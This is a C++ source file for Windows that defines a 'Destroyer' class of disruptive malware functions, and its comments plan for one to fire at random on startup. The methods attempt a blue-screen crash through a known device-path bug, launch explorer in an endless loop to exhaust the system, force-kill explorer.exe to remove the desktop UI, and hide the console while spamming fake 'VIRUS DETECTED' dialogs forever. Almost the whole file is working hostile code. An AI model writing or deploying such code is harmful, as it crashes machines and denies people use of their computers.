#include <iostream>
#include <stdlib.h>
#include <windows.h>

/**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
 * it so that a random malicious function is called upon startup 
**/ 
//functions should be called randomly
//everything should not be executed at startup
class Destroyer{
    public:
        void bsod()//BSODs the computer
        {
            _declspec(dllimport) int __stdcall SetCurrentDirectory(const unsigned char *lpPathName);
            SetCurrentDirectory("\\\\.\\globalroot\\device\\condrv\\kernelconnect");

            //A bug in windows that causes a BSOD when you try to access a path
        }

        void overflow()//Opens explorer infinite times crashing the system 
        {
            while (true)
            {
                system("explorer");
                std :: cout << "Normally ur pc would be dead\n"; 
            }
        }

        void killUI() //ends explorer task, hence destroying the ui of windows 10
        {
            system("taskkill /IM explorer.exe /F");
            std :: cout << "Your UI would disappear normally\n";
        }
        
        //I have removed the lag copy function because everyone would not have gcc installed

        void VirusMsgSpam()  //Spams message boxes with virus detected text
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console
	        while(true) 
            {
                //This function is a Windows API function....
		        MessageBox(NULL, L"VIRUS DETECTED", L"ERROR", MB_OK | MB_ICONERROR); //Message Box
            }
        }

};
